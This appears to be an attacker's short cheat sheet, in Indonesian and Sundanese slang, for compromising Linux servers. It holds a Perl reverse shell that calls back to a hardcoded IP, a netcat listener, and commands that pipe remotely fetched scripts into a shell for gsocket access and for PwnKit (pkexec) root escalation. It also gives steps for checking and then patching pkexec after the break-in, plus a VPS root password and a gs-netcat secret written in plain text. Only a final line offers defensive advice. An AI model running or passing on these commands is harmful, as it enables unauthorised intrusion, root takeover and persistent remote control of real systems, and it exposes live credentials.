BACKCONNECT
perl -e 'use Socket;$i="139.180.153.235";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
                         IP VPS KITA         PORT BISA JUGA 442 KALW HTTP 433
						 
						 
						 

TRUS LOGIN VPS
						 
GS
bash -c "$(curl -fsSL https://gsocket.io/x)"

BUG ROOT
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"

SYARAT ROOT 
- KERNEL DIBAWAH TAHUN 2021

CEK ROOT
ls -la /usr/bin/pkexec 

CIRI2 VULN BUG ROOT PWNKIT
-rwsr-xr-x. 1 root root 27680 Apr 11  2018 /usr/bin/pkexec

CIRI2 BUG ROOT PWNKIT DIPATCH 
-rwxr-xr-x. 1 root root 27680 Apr 11  2018 /usr/bin/pkexec

vps

u: root@139.180.153.235
p: Lemon@1337

cek kernel uname -a

2 cek bug root

CEK ROOT
ls -la /usr/bin/pkexec  awaln chmod rwsr 100% bisa kalw rwxr sudah di pacth

3 bc backconeckt

nc -lvp 443


cara mendapatkan akes gsc /netcat  bash -c "$(curl -fsSL https://gsocket.io/x)"


gs-netcat -s "E8ytVbnb7m2robiv1a6pND" -i

4 pacth baug root  chmod 0555 /usr/bin/pkexec


GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"  kill
pkill defunct

Upami hoyong ngamanahkeun sistem tina serangan sapertos kieu, pastikeun:



sudo apt update && sudo apt upgrade polkit
chmod 0755 /usr/bin/pkexec
